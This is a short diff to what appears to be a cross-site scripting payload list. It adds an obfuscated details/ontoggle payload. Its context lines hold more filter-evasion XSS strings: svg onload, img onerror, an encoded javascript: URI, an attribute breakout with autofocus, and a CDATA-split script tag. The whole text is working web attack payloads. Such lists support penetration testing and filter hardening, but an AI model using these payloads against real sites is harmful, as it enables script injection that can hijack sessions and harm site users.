@@ -9,6 +9,7 @@ a"><svg/onload=prompt(1)>
 "\u003e\u003cimg src=1 onerror=alert(0)\u003e
 %26%2302java%26%23115cript:alert(document.domain)
 DrakenKun"onfocus="prompt(1)"autofocus="
+<dETAILS%0aopen%0aonToGgle%0a%3d%0aa%3dprompt,a(origin)%20x>
 
 //XML
 <![CDATA[<]]>SCRIPT<![CDATA[>]]>alert('XSS');<![CDATA[<]]>/SCRIPT<![CDATA[>]]>
